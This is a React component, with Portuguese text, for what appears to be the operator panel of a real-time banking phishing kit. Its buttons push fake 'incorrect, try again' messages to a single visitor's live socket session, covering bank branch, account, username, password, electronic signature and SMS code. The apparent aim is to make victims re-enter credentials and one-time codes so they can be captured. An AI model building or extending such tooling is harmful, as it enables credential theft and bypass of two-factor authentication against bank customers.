'use client';

import { Dispatch, SetStateAction } from 'react';

import socket from '@/config/socket';
import AdminErrorProtocol from '@/interfaces/adminErrorProtocol';

interface Props {
  setShow: Dispatch<SetStateAction<boolean>>;
  socketId: string;
}

export default function Errors({ setShow, socketId }: Props) {
  const errors = [
    {
      message: 'Agência incorreta, tente novalmente',
      type: 'agency',
    },
    {
      message: 'Conta incorreta, tente novalmente',
      type: 'account',
    },
    {
      message: 'Usuário incorreto, tente novalmente',
      type: 'user',
    },
    {
      message: 'Senha incorreta, tente novalmente',
      type: 'password',
    },
    {
      message: 'Assinatura eletrônica incorreta, tente novalmente',
      type: 'electronicSignature',
    },
    {
      message: 'Códido sms incorreto, tente novalmente',
      type: 'sms',
    },
  ];

  const handleSocketEmitAdminError = (error: AdminErrorProtocol) => {
    socket.emit('admin-error', error);
  };

  const handleError = () => {
    const error: AdminErrorProtocol = {
      socketId,
      status: 'error em todos',
      errors,
    };

    handleSocketEmitAdminError(error);
    setShow(false);
  };

  const handleErrorAgency = () => {
    const error: AdminErrorProtocol = {
      socketId,
      status: 'error na agência',
      errors: errors.filter(item => item.type === 'agency'),
    };

    handleSocketEmitAdminError(error);
    setShow(false);
  };

  const handleErrorAccount = () => {
    const error: AdminErrorProtocol = {
      socketId,
      status: 'error na conta',
      errors: errors.filter(item => item.type === 'account'),
    };

    handleSocketEmitAdminError(error);
    setShow(false);
  };

  const handleErrorUser = () => {
    const error: AdminErrorProtocol = {
      socketId,
      status: 'error no usuário',
      errors: errors.filter(item => item.type === 'user'),
    };

    handleSocketEmitAdminError(error);
    setShow(false);
  };

  const handleErrorPassword = () => {
    const error: AdminErrorProtocol = {
      socketId,
      status: 'error na senha',
      errors: errors.filter(item => item.type === 'password'),
    };

    handleSocketEmitAdminError(error);
    setShow(false);
  };

  const handleErrorElectronicSignature = () => {
    const error: AdminErrorProtocol = {
      socketId,
      status: 'error na assinatura eletrônica',
      errors: errors.filter(item => item.type === 'electronicSignature'),
    };

    handleSocketEmitAdminError(error);
    setShow(false);
  };

  const handleErrorSMS = () => {
    const error: AdminErrorProtocol = {
      socketId,
      status: 'error no sms',
      errors: errors.filter(item => item.type === 'sms'),
    };

    handleSocketEmitAdminError(error);
    setShow(false);
  };

  return (
    <div className="flex flex-col gap-2 w-full">
      <h3 className="text-base font-normal text-black">Errors:</h3>
      <div className="w-full grid grid-cols-2 gap-3">
        <button
          type="button"
          className="bg-red-100 text-red-500 font-normal text-sm px-4 py-[5px] rounded-sm border border-solid border-black"
          onClick={handleErrorAgency}
        >
          Erro na agência
        </button>
        <button
          type="button"
          className="bg-red-100 text-red-500 font-normal text-sm px-4 py-[5px] rounded-sm border border-solid border-black"
          onClick={handleErrorAccount}
        >
          Erro na conta
        </button>
        <button
          type="button"
          className="bg-red-100 text-red-500 font-normal text-sm px-4 py-[5px] rounded-sm border border-solid border-black"
          onClick={handleErrorUser}
        >
          Erro no usuário
        </button>
        <button
          type="button"
          className="bg-red-100 text-red-500 font-normal text-sm px-4 py-[5px] rounded-sm border border-solid border-black"
          onClick={handleErrorPassword}
        >
          Erro na senha
        </button>
        <button
          type="button"
          className="bg-red-100 text-red-500 font-normal text-sm px-4 py-[5px] rounded-sm border border-solid border-black"
          onClick={handleErrorElectronicSignature}
        >
          Erro na assinatura eletrônica
        </button>
        <button
          type="button"
          className="bg-red-100 text-red-500 font-normal text-sm px-4 py-[5px] rounded-sm border border-solid border-black"
          onClick={handleErrorSMS}
        >
          Erro no código SMS
        </button>
        <button
          type="button"
          className="bg-red-100 text-red-500 font-normal text-sm px-4 py-[5px] rounded-sm border border-solid border-black"
          onClick={handleError}
        >
          Erro em ambos
        </button>
      </div>
    </div>
  );
}
